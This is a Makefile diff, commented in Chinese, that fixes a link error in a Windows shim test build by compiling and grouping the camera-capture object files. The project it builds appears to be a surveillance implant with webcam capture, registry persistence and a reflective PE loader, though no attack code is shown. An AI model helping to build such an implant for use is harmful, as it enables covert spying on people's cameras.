@@ -132,12 +132,28 @@ SHIM_CC    := $(CC) -std=c11 -O1 -Wall -Wextra $(SHIM_I) \
 
 .PHONY: winshim winshim-build
 
+# 采集能力目标文件组。
+#
+# 凡链接了"通过统一 cam_source_create 取后端"的源码（implant.c 是，
+# test_mf_logic.cpp 也是），都必须带上 cam_factory.o —— 工厂是唯一提供该
+# 符号的目标文件。此前只在 test_implant_main 一处链了它，test_mf_logic
+# 漏掉，实跑 winshim-build 时 undefined reference（真实构建破损）。
+#
+# 打包成变量而不是各处手写：漏一处就是链接期才暴露的破损，而且报错是
+# "undefined reference to cam_source_create"，看不出缺的是哪个 .o。
+SHIM_CAM_OBJS := $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
+                 $(SHIM_BUILD)/cam_factory.o
+
 winshim-build:
 	@mkdir -p $(SHIM_BUILD)
+	# 工厂先编译：它提供统一的 cam_source_create / cam_source_destroy，
+	# 本目标下所有需要采集能力的链接都要链它，必须先于那些链接产出。
+	$(SHIM_CXX) -x c++ -c src/cam_factory.c -o $(SHIM_BUILD)/cam_factory.o
 	$(SHIM_CXX) -c src/cam_mf.cpp -o $(SHIM_BUILD)/cam_mf.o
 	$(SHIM_CXX) -c tests/winsdk_shim/shim_impl.cpp -o $(SHIM_BUILD)/shim_impl.o
 	$(SHIM_CXX) -c tests/test_mf_logic.cpp -o $(SHIM_BUILD)/test_mf_logic.o
-	$(CXX) $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/shim_impl.o \
+	$(CXX) $(SHIM_BUILD)/cam_factory.o $(SHIM_BUILD)/cam_mf.o \
+	      $(SHIM_BUILD)/shim_impl.o \
 	      $(SHIM_BUILD)/test_mf_logic.o -o $(SHIM_BUILD)/test_mf_logic
 	# G2：持久化。persist_win.c 是 Windows 专属源码，用 -x c++ 编译，
 	#     链接 shim_impl.o 提供的有状态注册表 mock，安装行为可真读回验证。
@@ -154,15 +170,14 @@ winshim-build:
 	$(SHIM_CXX) -x c++ -c ../17_loader/src/reflect.c -o $(SHIM_BUILD)/reflect.o
 	$(SHIM_CXX) -x c++ -c src/implant.c -o $(SHIM_BUILD)/implant.o
 	$(SHIM_CXX) -x c++ -c src/cam_jpeg.c -o $(SHIM_BUILD)/cam_jpeg.o
-	$(SHIM_CXX) -x c++ -c src/cam_factory.c -o $(SHIM_BUILD)/cam_factory.o
+	# cam_factory.o 已在本目标开头编译（见上），此处不再重复。
 	$(SHIM_CXX) -c tests/test_implant_main.cpp -o $(SHIM_BUILD)/test_implant_main.o
 	# 采集后端用 cam_mf.o（Windows 真实代码路径 + shim 假设备），而不是
 	# cam_mock.o：这样验证的是 Windows 采集路径本身能被主循环驱动。
 	# （分发层 cam_factory.o 已单独链入，见上。）
 	$(CXX) $(SHIM_BUILD)/implant_main.o $(SHIM_BUILD)/implant.o \
 	      $(SHIM_BUILD)/reflect_run.o $(SHIM_BUILD)/pe.o $(SHIM_BUILD)/reflect.o \
-	      $(SHIM_BUILD)/cam_mf.o $(SHIM_BUILD)/cam_jpeg.o \
-	      $(SHIM_BUILD)/cam_factory.o \
+	      $(SHIM_CAM_OBJS) \
 	      $(SHIM_BUILD)/persist_win.o $(SHIM_BUILD)/shim_impl.o \
 	      $(SHIM_BUILD)/test_implant_main.o -o $(SHIM_BUILD)/test_implant_main
 
